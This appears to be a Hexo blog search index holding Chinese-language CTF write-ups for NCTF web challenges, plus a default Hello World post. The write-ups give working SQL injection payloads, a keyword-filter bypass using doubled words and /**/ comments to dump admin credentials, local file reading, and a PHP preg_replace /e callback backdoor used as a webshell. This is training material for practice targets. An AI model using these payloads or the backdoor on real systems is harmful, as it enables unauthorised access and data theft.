<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[nctf-sql inject汇总]]></title>
    <url>%2F2018%2F04%2F16%2Fnctf-sql-inject%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[1.SQL Injection&lt;a herf=http://chinalover.sinaapp.com/web15/index.php&gt;题目链接 进入题目，只有一个Invalid password!。习惯性的查看源码，得到： 12345678910111213141516171819202122232425262728293031323334#GOAL: login as admin,then get the flag;error_reporting(0);require &apos;db.inc.php&apos;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&apos;Invalid password!&apos;);&#125;echo $flag;//magic_quotes_gpc()开启时为获得的字符中的单引号等字符进行转义，get_magic_quotes_gpc()为检查magic_quotes_gpc()是否开启stripslashes函数为字符串中删除由addslashes函数添加的反斜杠htmlentities()函数： htmlentities() 函数把字符转换为 HTML 实体htmlentities($str, ENT_COMPAT); 只转换双引号htmlentities($str, ENT_QUOTES); 转换双引号和单引号htmlentities($str, ENT_NOQUOTES); 不转换任何引号 可以知道，这里username要为admin，然后password这里可以用万能密码绕过。这里对字符串也使用了htmlentities函数处理，过滤了单引号。根据题目的提示我们可以用反斜杠来转义一个单引号，从而让其闭合。我们让username的value为admin\，password为or 1=1#,把这个带到sql语句中： 1SELECT * FROM users WHERE name=\&apos;&apos;admin\&apos;\&apos; AND pass=\&apos;&apos;or 1=1#&apos;\&apos;; 这里就变成了SELECT * FROM users WHERE name=’admin\’ AND pass=’ or 1=1#’; 这里name的值变为admin AND pass=,为false，加上or 1=1就为ture了。 这样子flag就出来了。 ​ 注：在mysql查询语句中转义字符不参与闭合 也就是说第二个单引号和第六个单引号闭合。 2.SQL注入1&lt;a herf=http://chinalover.sinaapp.com/index.phps&gt;题目地址 题目一进去就可以点source查看源码，明显是一个代码审计的题。 123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;; echo &apos;&lt;/br&gt;&apos;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt; 这里就是post一个user一个pass，然后把pass进行md5加密。然后执行sql语句，然后把结果集赋给变量query。echo flag 的条件就是结果集里user的value为admin即可。那么这个和pass无关。我们可以构造把pass注释掉。 即user的值为admin’)#,然后pass随便填即可得到flag 3.SQL注入2&lt;a herf=http://4.chinalover.sinaapp.com/web6/index.php&gt;题目链接 这题也是代码审计的，查看源码： 123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; 这题和上一题不同的是这里echo flag的条件是让我们输入的password和数据库里的pass对比，相同就echo flag。那这个就无法用注释符来处理。题目的tip说union查询。我们要使满足条件，可以尝试修改sql的值，使select pw…..语句失效，然后执行我们后面的payload。所以构造user的值为1’ and 0=1 union select md5(1)# 即替换后sql语句变成了 1select pw from ctf where user=&apos;1&apos;and 0=1 union select md5(1)#&apos; 前面的‘1’ and 0=1使得前面那一些语句失效。sql的值就等于md5(1).于是我们pass也输入1即可。]]></content>
  </entry>
  <entry>
    <title><![CDATA[nctf-综合题2 wp]]></title>
    <url>%2F2018%2F04%2F15%2Fnctf-%E7%BB%BC%E5%90%88%E9%A2%982%2F</url>
    <content type="text"><![CDATA[【综合题2】 &lt;a herf=http://cms.nuptzj.cn/&gt;题目链接 进入题目，发现是个留言板。下面有留言框，于是试试xss，结果写完xss语句点击预览时，根据提示，这题不是xss的题目。因为题目说是个综合题，肯定要后台getshell的，然后getshell的方法最容易想到的就是sql得到后台账号密码，然后用一句话木马加菜刀。于是接下来开始对这个网站收集信息。 ​ 按从上到下的顺序，映入眼帘的是那个留言搜索，于是随便输一个数，点搜索。界面显示，要也他们的浏览器才行，说明这个要改UA。然后这个搜索的页面是so.php，post的变量为soid，明显这个是等会的注入点。 既然不知道要把UA改成什么，于是，进行其他的收集。那个留言框可以排除掉了，毕竟题目自己都说这个是个摆设。 于是，就剩下下面那个本CMS说明了。在这里面，我们可以发现，这里是一个文件包含。而且也可以得知有一个叫admin的表，表里有username和userpass字段。而且也列出了config.php,index.php,passencode.php,say.php.前2个是配置文件，没什么用。用文件包含读取第三个。得到源码： 123456789101112131415&lt;?phpfunction passencode($content)&#123;//$pass=urlencode($content);$array=str_split($content);$pass=&quot;&quot;;for($i=0;$i&lt;count($array);$i++)&#123;if($pass!=&quot;&quot;)&#123;$pass=$pass.&quot; &quot;.(string)ord($array[$i]);&#125;else&#123;$pass=(string)ord($array[$i]);&#125;&#125;return $pass;&#125;?&gt; 这个意思大概就是把密码进行了ascii码加密。 say.php里没发现什么。然后我们再来读取一下刚才的搜索页面的so.php，得到源码： 1234567891011121314151617181920&lt;?phpif($_SERVER[&apos;HTTP_USER_AGENT&apos;]!=&quot;Xlcteam Browser&quot;)&#123;echo &apos;万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~&apos;; exit();&#125;$id=$_POST[&apos;soid&apos;];include &apos;config.php&apos;;include &apos;antiinject.php&apos;;include &apos;antixss.php&apos;;$id=antiinject($id);$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;不能连接到数据库！！&quot;.mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query(&quot;SELECT * FROM `message` WHERE display=1 AND id=$id&quot;);$rs=mysql_fetch_array($result);echo htmlspecialchars($rs[&apos;nice&apos;]).&apos;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;.antixss($rs[&apos;say&apos;]).&apos;&lt;br /&gt;&apos;;mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt; 这里可以知道UA应该为Xlcteam Browser。而且这里又知道了几个文件，antiinject.php和antixss.php，因为xss没用了，所以我们读取antiinject.php。得到源码： 12345678910&lt;?phpfunction antiinject($content)&#123;$keyword=array(&quot;select&quot;,&quot;union&quot;,&quot;and&quot;,&quot;from&quot;,&apos; &apos;,&quot;&apos;&quot;,&quot;;&quot;,&apos;&quot;&apos;,&quot;char&quot;,&quot;or&quot;,&quot;count&quot;,&quot;master&quot;,&quot;name&quot;,&quot;pass&quot;,&quot;admin&quot;,&quot;+&quot;,&quot;-&quot;,&quot;order&quot;,&quot;=&quot;);$info=strtolower($content);for($i=0;$i&lt;=count($keyword);$i++)&#123; $info=str_replace($keyword[$i], &apos;&apos;,$info);&#125;return $info;&#125;?&gt; 这里我们可以知道，它把sql注入的关键字替换成了空。这个可以用双写来绕过。空格可以用/**/绕过。 然后回到刚才那个搜索界面，知道了UA，用火狐的插件Modify headers，add一个UA，值为Xlcteam Browser。 然后我们既然知道了表名和列名，于是直接构造sql语句： 12345soid=-1/**/ununionion/**/seleselectct/**/1,group_concat(usernanameme),3,4/**/frfromom/**/adadminmin#//得到用户名为adminsoid=-1/**/ununionion/**/seleselectct/**/1,group_concat(userpapassss),3,4/**/frfromom/**/adadminmin#得到 102 117 99 107 114 117 110 116 117。//根据前面那个passencode.php知道，这里是ascii码，于是密码就是fuckruntu。 现在就开始找后台登陆界面了。我们好像剩下一个那个cms说明的本身有关about.php还没有读取。于是读取得 12345678910111213141516&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;?php$file=$_GET[&apos;file&apos;];if($file==&quot;&quot; || strstr($file,&apos;config.php&apos;))&#123;echo &quot;file参数不能为空！&quot;;exit();&#125;else&#123;$cut=strchr($file,&quot;loginxlcteam&quot;);if($cut==false)&#123;$data=file_get_contents($file);$date=htmlspecialchars($data);echo $date;&#125;else&#123;echo &quot;&lt;script&gt;alert(&apos;敏感目录，禁止查看！但是。。。&apos;)&lt;/script&gt;&quot;;&#125;&#125; 于是知道有个叫loginxlcteam的文件，用包含读取不了，于是直接访问，得到了登陆界面。 于是登陆进入后台。 诶，这里都不用我们上传一句话木马了。由于不知道连接密码。后来才知道有个叫php回调后门 https://blog.csdn.net/settoken/article/details/50946689 读取xlcteam.php得 12345&lt;?php$e = $_REQUEST[&apos;www&apos;];$arr = array($_POST[&apos;wtf&apos;] =&gt; &apos;|.*|e&apos;,);array_walk($arr, $e, &apos;&apos;);?&gt; 这个对应了博文里的第四种情况。 于是构建http://cms.nuptzj.cn/xlcteam.php?www=preg_replace，密码就是wtf。用菜刀连接即可。 —–&gt;flag:nctf{you_are_s0_g00d_hacker}]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F04%2F02%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
